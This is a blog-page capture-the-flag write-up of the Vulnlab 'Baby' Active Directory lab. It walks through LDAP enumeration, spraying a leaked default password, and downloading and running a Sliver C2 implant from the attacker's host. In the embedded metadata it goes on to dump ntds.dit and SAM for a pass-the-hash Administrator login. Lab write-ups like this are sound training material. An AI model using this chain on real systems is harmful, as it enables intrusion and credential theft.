<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Vulnlab - Baby [Easy] | 0x73796C31</title>
<meta name=keywords content="vulnlab"><meta name=description content="Recently I&rsquo;ve started to explore more platforms for hacking different type of boxes and I found that xct has created vulndev. From what I&rsquo;ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the &ldquo;Baby&rdquo; lab.
User / Initial Foothold Started with a nmap scan:
sylsec$ nmap -p- -sT -v -A --open -T 4 --script vuln* -oN nmap."><meta name=author content="Dimitar Ganev"><link rel=canonical href=https://sy1.sh/writeups/vulnlab-baby/><link crossorigin=anonymous href=/assets/css/stylesheet.f8c2ee4fde28779dff9afcd3046f6bd6fc9cbeb1ddf60d48a81b676d7162c1bb.css integrity="sha256-+MLuT94od53/mvzTBG9r1vycvrHd9g1IqBtnbXFiwbs=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://sy1.sh/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sy1.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sy1.sh/favicon-32x32.png><link rel=apple-touch-icon href=https://sy1.sh/apple-touch-icon.png><link rel=mask-icon href=https://sy1.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Vulnlab - Baby [Easy]"><meta property="og:description" content="Recently I&rsquo;ve started to explore more platforms for hacking different type of boxes and I found that xct has created vulndev. From what I&rsquo;ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the &ldquo;Baby&rdquo; lab.
User / Initial Foothold Started with a nmap scan:
sylsec$ nmap -p- -sT -v -A --open -T 4 --script vuln* -oN nmap."><meta property="og:type" content="article"><meta property="og:url" content="https://sy1.sh/writeups/vulnlab-baby/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-12-18T03:42:27+03:00"><meta property="article:modified_time" content="2023-12-18T03:42:27+03:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Vulnlab - Baby [Easy]"><meta name=twitter:description content="Recently I&rsquo;ve started to explore more platforms for hacking different type of boxes and I found that xct has created vulndev. From what I&rsquo;ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the &ldquo;Baby&rdquo; lab.
User / Initial Foothold Started with a nmap scan:
sylsec$ nmap -p- -sT -v -A --open -T 4 --script vuln* -oN nmap."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Writeups","item":"https://sy1.sh/writeups/"},{"@type":"ListItem","position":3,"name":"Vulnlab - Baby [Easy]","item":"https://sy1.sh/writeups/vulnlab-baby/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Vulnlab - Baby [Easy]","name":"Vulnlab - Baby [Easy]","description":"Recently I\u0026rsquo;ve started to explore more platforms for hacking different type of boxes and I found that xct has created vulndev. From what I\u0026rsquo;ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the \u0026ldquo;Baby\u0026rdquo; lab.\nUser / Initial Foothold Started with a nmap scan:\nsylsec$ nmap -p- -sT -v -A --open -T 4 --script vuln* -oN nmap.","keywords":["vulnlab"],"articleBody":"Recently I’ve started to explore more platforms for hacking different type of boxes and I found that xct has created vulndev. From what I’ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the “Baby” lab.\nUser / Initial Foothold Started with a nmap scan:\nsylsec$ nmap -p- -sT -v -A --open -T 4 --script vuln* -oN nmap.txt -sC -sV $ip -Pn PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services 49664/tcp open msrpc Microsoft Windows RPC 49675/tcp open msrpc Microsoft Windows RPC 59647/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=12/17%Time=657F4FC2%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03\"); Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows We can clearly see that this is a Windows machine that is also a part of Active Directory. The domain seems to be baby.vl, I will add this to my /etc/hosts file. After that, I ran enum4linux.\n(I will post only the interesting results)\nsylsec$ enum4linux $ip ... [*] Trying LDAP [+] Appears to be root/parent DC [+] Long domain name is: baby.vl ... [+] Found domain information via SMB NetBIOS computer name: BABYDC NetBIOS domain name: BABY DNS domain: baby.vl FQDN: BabyDC.baby.vl Derived membership: domain member Derived domain: BABY ... Server allows session using username '', password '' ... [+] Domain: BABY [+] Domain SID: S-1-5-21-1407081343-4001094062-1444647654 [+] Membership: domain member ... OS: Windows 10, Windows Server 2019, Windows Server 2016 OS version: '10.0' OS release: '' OS build: '20348' ... This scan yieled some useful results like the computer name and some information about the system, usually I would try enumerate some more with ldapsearch.\nsylsec$ ldapsearch -LLL -x -H ldap://$ip -b '' -s base '(objectclass=*)' ... rootDomainNamingContext: DC=baby,DC=vl ldapServiceName: baby.vl:babydc$@BABY.VL This didn’t yield that much information but we can search for the specific domain components (baby,vl)\n(Only the interesting information)\nsylsec$ ldapsearch -x -H ldap://$ip -D '' -w '' -b \"DC=baby,DC=vl\" ... # Teresa Bell, it, baby.vl dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: Teresa Bell sn: Bell description: Set initial password to BabyStart123! ... Now we’ve learned that the initial password for the users is BabyStart123!, we can save all the found users under users.txt and try the password against all of them with netexec (previously CrackMapExec).\nsylsec$ netexec smb $ip -u ./users.txt -p ./passwords.txt SMB 10.10.83.68 445 BABYDC [*] Windows 10.0 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) ... SMB 10.10.10.6 445 BABYDC [-] baby.vl\\caroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE ... We found that the user caroline.robinson has the status STATUS_PASSWORD_MUST_CHANGE, we can use smbpasswd.py from the impacket scripts to change the password.\nsylsec$ python3 smbpasswd.py baby.vl/Caroline.Robinson:'BabyStart123!'@$ip -newpass Summer2018! [!] Password is expired, trying to bind with a null session. [*] Password was changed successfully. Now, let’s try to use WinRM to log in to the machine.\nsylsec$ evil-winrm -i $ip -u Caroline.Robinson -p 'Summer2018!' *Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents\u003e *Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents\u003e type ..\\Desktop\\user.txt VL{} Root / Privilege Escalation Since I highly dislike evil-winrm due to its instability (atleast on my machine) and the fact that the machine has an active defender which will flag most of the binaries that I will try to put for further enumeration as malicious, I decided to spin up SilverC2.\nsylsec$ silversrv\r██████ ██▓ ██▓ ██▒ █▓▓█████ ██▀███\r▒██ ▒ ▓██▒ ▓██▒▓██░ █▒▓█ ▀ ▓██ ▒ ██▒\r░ ▓██▄ ▒██░ ▒██▒ ▓██ █▒░▒███ ▓██ ░▄█ ▒\r▒ ██▒▒██░ ░██░ ▒██ █░░▒▓█ ▄ ▒██▀▀█▄\r▒██████▒▒░██████▒░██░ ▒▀█░ ░▒████▒░██▓ ▒██▒\r▒ ▒▓▒ ▒ ░░ ▒░▓ ░░▓ ░ ▐░ ░░ ▒░ ░░ ▒▓ ░▒▓░\r░ ░▒ ░ ░░ ░ ▒ ░ ▒ ░ ░ ░░ ░ ░ ░ ░▒ ░ ▒░\r░ ░ ░ ░ ░ ▒ ░ ░░ ░ ░░ ░\r░ ░ ░ ░ ░ ░ ░ ░\rAll hackers gain fear\r[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b\r[*] Welcome to the sliver shell, please type 'help' for options\r[*] Check for updates with the 'update' command\r[server] sliver \u003e generate --mtls tun0:8888\r[*] Generating new windows/amd64 implant binary\r[*] Symbol obfuscation is enabled\r[*] Build completed in 39s\r[*] Implant saved to /home/syl/vulnlab/Baby/EXISTING_CROTCH.exe Now, that I have an implant, I’ve transferred it to the server with Invoke-WebRequest.\n*Evil-WinRM* PS C:\\Windows\\TEMP\u003e iwr http://\u003cmyIp\u003e:8000/EXISTING_CROTCH.exe -OutFile EXISTING_CROTCH.exe *Evil-WinRM* PS C:\\Windows\\TEMP\u003e .\\EXISTING_CROTCH.exe I’ve set up a listener and once I invoke the implant on the machine I will get a session on my server.\n[*] Session b7e812e4 EXISTING_CROTCH - 10.10.83.8:52141 (BabyDC) - windows/amd64 - Mon, 18 Dec 2023 09:57:19 EET Then I’ve started to enumerate the privileges first.\n[server] sliver (EXISTING_CROTCH) \u003e getprivs\rPrivilege Information for EXISTING_CROTCH.exe (PID: 3248)\r---------------------------------------------------------\rProcess Integrity Level: High\rName Description Attributes\r==== =========== ==========\rSeMachineAccountPrivilege Add workstations to domain Enabled, Enabled by Default\rSeBackupPrivilege Back up files and directories Enabled, Enabled by Default\rSeRestorePrivilege Restore files and directories Enabled, Enabled by Default\rSeShutdownPrivilege Shut down the system Enabled, Enabled by Default\rSeChangeNotifyPrivilege Bypass traverse checking Enabled, Enabled by Default\rSeIncreaseWorkingSetPrivilege Increase a process working set Enabled, Enabled by Default And I noticed that we have the SeBackupPrivilege and SeRestorePrivilege privilege enabled, that automatically means that we can abuse those to get the ntds.dit,SAM,SYSTEM files to obtain some hashes that we can use further to escalate our privileges.\nThere are a lot of resources for this technique, here are some of my favorite reads:\nhttps://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960 https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#shell-as-svc_backup https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/ I created a file on my local system called syl.dsh which is basically a script file that can execute series of commands, the contents is as follows:\nset context persistent nowriters add volume c: alias syl create expose %syl% z: This sets the context to be persistent, so that the shadow copies will be kept after the diskshadow session is closed. Then we add a shadowcopy of the C:\\ drive with the alias syl, we create it and we expose it as another drive Z:\nThen we can download the shadow copy of the ntds file using the SilverC2’s interactive mode.\n[server] sliver (EXISTING_CROTCH) \u003e download Z:\\Windows\\ntds And we also need the SYSTEM and SAM files, which we can get by invoking the reg utility.\n[server] sliver (EXISTING_CROTCH) \u003e reg save hklm\\sam c:\\Temp\\sam [server] sliver (EXISTING_CROTCH) \u003e reg save hklm\\system c:\\Temp\\system ... [server] sliver (EXISTING_CROTCH) \u003e download system [*] Wrote 16842752 bytes (1 file successfully, 0 files unsuccessfully) to /home/syl/vulnlab/Baby/system [server] sliver (EXISTING_CROTCH) \u003e download SAM [*] Wrote 16842752 bytes (1 file successfully, 0 files unsuccessfully) to /home/syl/vulnlab/Baby/SAM Now we can extract the hashes with impacket-secretsdump\nsylsec$ python3 secretsdump.py -system /home/syl/vulnlab/Baby/exfiltrated/system -sam /home/syl/vulnlab/Baby/exfiltrated/SAM -ntds /home/syl/vulnlab/Baby/exfiltrated/ntds.dit LOCAL ... Administrator:500:aad3b435b51404eeaad3b435b51404ee:::: ... And once we’ve extracted the hash, we can log in to the DC using WinRM.\nsylsec$ evil-winrm -i $ip -u Administrator -H $hash *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e type root.txt VL{} ","wordCount":"1189","inLanguage":"en","datePublished":"2023-12-18T03:42:27+03:00","dateModified":"2023-12-18T03:42:27+03:00","author":{"@type":"Person","name":"Dimitar Ganev"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sy1.sh/writeups/vulnlab-baby/"},"publisher":{"@type":"Organization","name":"0x73796C31","logo":{"@type":"ImageObject","url":"https://sy1.sh/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sy1.sh accesskey=h title="0x73796C31 (Alt + H)">0x73796C31</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://sy1.sh/posts/ title=Archive><span>Archive</span></a></li><li><a href=https://sy1.sh/cv title=CV><span>About</span></a></li><li><a href=https://sy1.sh/writeups/ title=Write-ups><span>Write-ups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sy1.sh>Home</a>&nbsp;»&nbsp;<a href=https://sy1.sh/writeups/>Writeups</a></div><h1 class=post-title>Vulnlab - Baby [Easy]</h1><div class=post-meta>&lt;span title='2023-12-18 03:42:27 +0300 +0300'>December 18, 2023&lt;/span>&amp;nbsp;·&amp;nbsp;6 min</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#user--initial-foothold aria-label="User / Initial Foothold">User / Initial Foothold</a></li><li><a href=#root--privilege-escalation aria-label="Root / Privilege Escalation">Root / Privilege Escalation</a></li></ul></div></details></div><div class=post-content><p>Recently I&rsquo;ve started to explore more platforms for hacking different type of boxes and I found that <code>xct</code> has created <code>vulndev</code>. From what I&rsquo;ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the &ldquo;Baby&rdquo; lab.</p><h1 id=user--initial-foothold>User / Initial Foothold<a hidden class=anchor aria-hidden=true href=#user--initial-foothold>#</a></h1><p>Started with a nmap scan:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sylsec$ nmap -p- -sT -v -A --open -T <span class=m>4</span> --script vuln* -oN nmap.txt -sC -sV <span class=nv>$ip</span> -Pn
</span></span><span class=line><span class=cl>PORT      STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>53/tcp    open  domain?
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   DNSVersionBindReqTCP: 
</span></span><span class=line><span class=cl><span class=p>|</span>     version
</span></span><span class=line><span class=cl><span class=p>|</span>_    <span class=nb>bind</span>
</span></span><span class=line><span class=cl>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds?
</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5?
</span></span><span class=line><span class=cl>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: baby.vl0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>3269/tcp  open  tcpwrapped
</span></span><span class=line><span class=cl>3389/tcp  open  ms-wbt-server Microsoft Terminal Services
</span></span><span class=line><span class=cl>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49675/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>59647/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port53-TCP:V<span class=o>=</span>7.80%I<span class=o>=</span>7%D<span class=o>=</span>12/17%Time<span class=o>=</span>657F4FC2%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>DNS
</span></span><span class=line><span class=cl>SF:VersionBindReqTCP,20,<span class=s2>&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x04bind\0\0\x10\0\x03&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>Service Info: Host: BABYDC<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span></code></pre></div><p>We can clearly see that this is a Windows machine that is also a part of Active Directory. The domain seems to be <code>baby.vl</code>, I will add this to my <code>/etc/hosts</code> file. After that, I ran <code>enum4linux</code>.</p><p>(I will post only the interesting results)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sylsec$ enum4linux <span class=nv>$ip</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying LDAP
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Appears to be root/parent DC
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Long domain name is: baby.vl
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Found domain information via SMB
</span></span><span class=line><span class=cl>NetBIOS computer name: BABYDC
</span></span><span class=line><span class=cl>NetBIOS domain name: BABY
</span></span><span class=line><span class=cl>DNS domain: baby.vl
</span></span><span class=line><span class=cl>FQDN: BabyDC.baby.vl
</span></span><span class=line><span class=cl>Derived membership: domain member
</span></span><span class=line><span class=cl>Derived domain: BABY
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Server allows session using username <span class=s1>&#39;&#39;</span>, password <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Domain: BABY
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Domain SID: S-1-5-21-1407081343-4001094062-1444647654
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Membership: domain member
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>OS: Windows 10, Windows Server 2019, Windows Server <span class=m>2016</span>
</span></span><span class=line><span class=cl>OS version: <span class=s1>&#39;10.0&#39;</span>
</span></span><span class=line><span class=cl>OS release: <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>OS build: <span class=s1>&#39;20348&#39;</span>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>This scan yieled some useful results like the computer name and some information about the system, usually I would try enumerate some more with <code>ldapsearch</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sylsec$ ldapsearch -LLL -x -H ldap://<span class=nv>$ip</span> -b <span class=s1>&#39;&#39;</span> -s base <span class=s1>&#39;(objectclass=*)&#39;</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>rootDomainNamingContext: <span class=nv>DC</span><span class=o>=</span>baby,DC<span class=o>=</span>vl
</span></span><span class=line><span class=cl>ldapServiceName: baby.vl:babydc<span class=nv>$@</span>BABY.VL
</span></span></code></pre></div><p>This didn&rsquo;t yield that much information but we can search for the specific domain components (<code>baby,vl</code>)</p><p>(Only the interesting information)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sylsec$ ldapsearch -x -H ldap://<span class=nv>$ip</span> -D <span class=s1>&#39;&#39;</span> -w <span class=s1>&#39;&#39;</span> -b <span class=s2>&#34;DC=baby,DC=vl&#34;</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=c1># Teresa Bell, it, baby.vl</span>
</span></span><span class=line><span class=cl>dn: <span class=nv>CN</span><span class=o>=</span>Teresa Bell,OU<span class=o>=</span>it,DC<span class=o>=</span>baby,DC<span class=o>=</span>vl
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: person
</span></span><span class=line><span class=cl>objectClass: organizationalPerson
</span></span><span class=line><span class=cl>objectClass: user
</span></span><span class=line><span class=cl>cn: Teresa Bell
</span></span><span class=line><span class=cl>sn: Bell
</span></span><span class=line><span class=cl>description: Set initial password to BabyStart123!
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>&lt;other users&gt;
</span></span></code></pre></div><p>Now we&rsquo;ve learned that the initial password for the users is <code>BabyStart123!</code>, we can save all the found users under users.txt and try the password against all of them with <code>netexec</code> (previously <code>CrackMapExec</code>).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sylsec$ netexec smb <span class=nv>$ip</span> -u ./users.txt -p ./passwords.txt 
</span></span><span class=line><span class=cl>SMB         10.10.83.68     <span class=m>445</span>    BABYDC           <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>20348</span> x64 <span class=o>(</span>name:BABYDC<span class=o>)</span> <span class=o>(</span>domain:baby.vl<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>SMB         10.10.10.6      <span class=m>445</span>    BABYDC           <span class=o>[</span>-<span class=o>]</span> baby.vl<span class=se>\c</span>aroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>We found that the user <code>caroline.robinson</code> has the status <code>STATUS_PASSWORD_MUST_CHANGE</code>, we can use <code>smbpasswd.py</code> from the impacket scripts to change the password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sylsec$ python3 smbpasswd.py baby.vl/Caroline.Robinson:<span class=s1>&#39;BabyStart123!&#39;</span>@<span class=nv>$ip</span> -newpass Summer2018!
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Password is expired, trying to <span class=nb>bind</span> with a null session.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Password was changed successfully.
</span></span></code></pre></div><p>Now, let&rsquo;s try to use WinRM to log in to the machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sylsec$ evil-winrm -i <span class=nv>$ip</span> -u Caroline.Robinson -p <span class=s1>&#39;Summer2018!&#39;</span>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\C</span>aroline.Robinson<span class=se>\D</span>ocuments&gt; 
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\C</span>aroline.Robinson<span class=se>\D</span>ocuments&gt; <span class=nb>type</span> ..<span class=se>\D</span>esktop<span class=se>\u</span>ser.txt
</span></span><span class=line><span class=cl>VL<span class=o>{</span>&lt;hash&gt;<span class=o>}</span>
</span></span></code></pre></div><h1 id=root--privilege-escalation>Root / Privilege Escalation<a hidden class=anchor aria-hidden=true href=#root--privilege-escalation>#</a></h1><p>Since I highly dislike <code>evil-winrm</code> due to its instability (atleast on my machine) and the fact that the machine has an active defender which will flag most of the binaries that I will try to put for further enumeration as malicious, I decided to spin up <a href=https://github.com/BishopFox/sliver>SilverC2</a>.</p><pre tabindex=0><code>sylsec$ silversrv

          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
                  ░      ░  ░ ░        ░     ░  ░   ░

All hackers gain fear
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type &#39;help&#39; for options

[*] Check for updates with the &#39;update&#39; command

[server] sliver &gt; generate --mtls tun0:8888
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 39s
[*] Implant saved to /home/syl/vulnlab/Baby/EXISTING_CROTCH.exe
</code></pre><p>Now, that I have an implant, I&rsquo;ve transferred it to the server with <code>Invoke-WebRequest</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>TEMP</span><span class=p>&gt;</span> <span class=nb>iwr </span><span class=n>http</span><span class=err>:</span><span class=p>//&lt;</span><span class=n>myIp</span><span class=p>&gt;</span><span class=err>:</span><span class=mf>8000</span><span class=p>/</span><span class=n>EXISTING_CROTCH</span><span class=p>.</span><span class=py>exe</span> <span class=n>-OutFile</span> <span class=n>EXISTING_CROTCH</span><span class=p>.</span><span class=py>exe</span>
</span></span><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>TEMP</span><span class=p>&gt;</span> <span class=p>.\</span><span class=n>EXISTING_CROTCH</span><span class=p>.</span><span class=py>exe</span>
</span></span></code></pre></div><p>I&rsquo;ve set up a listener and once I invoke the implant on the machine I will get a session on my server.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Session b7e812e4 EXISTING_CROTCH - 10.10.83.8:52141 <span class=o>(</span>BabyDC<span class=o>)</span> - windows/amd64 - Mon, <span class=m>18</span> Dec <span class=m>2023</span> 09:57:19 EET
</span></span></code></pre></div><p>Then I&rsquo;ve started to enumerate the privileges first.</p><pre tabindex=0><code>[server] sliver (EXISTING_CROTCH) &gt; getprivs

Privilege Information for EXISTING_CROTCH.exe (PID: 3248)
---------------------------------------------------------

Process Integrity Level: High

Name                            Description                     Attributes
====                            ===========                     ==========
SeMachineAccountPrivilege       Add workstations to domain      Enabled, Enabled by Default
SeBackupPrivilege               Back up files and directories   Enabled, Enabled by Default
SeRestorePrivilege              Restore files and directories   Enabled, Enabled by Default
SeShutdownPrivilege             Shut down the system            Enabled, Enabled by Default
SeChangeNotifyPrivilege         Bypass traverse checking        Enabled, Enabled by Default
SeIncreaseWorkingSetPrivilege   Increase a process working set  Enabled, Enabled by Default
